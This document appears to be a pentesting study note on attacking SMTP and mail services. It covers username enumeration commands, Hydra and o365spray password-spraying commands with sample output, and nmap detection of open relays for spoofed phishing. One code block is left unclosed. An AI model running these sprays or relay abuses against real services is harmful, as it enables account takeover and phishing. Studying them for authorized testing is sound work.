# SMTP

## Misconfiguration

Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.

### **Authentication**

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

## Password Attacks

We can use [hydra.md](../../tooling/hydra.md "mention") to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

### **Hydra - Password Attack**

```bash
clue@machine[~]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

### **O365 Spray - Password Spraying**

```bash
clue@machine[~]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

## Open Relay Technique

An open relay is a Simple Mail Transfer Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```bash
clue@machine[~]$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

```shell-session
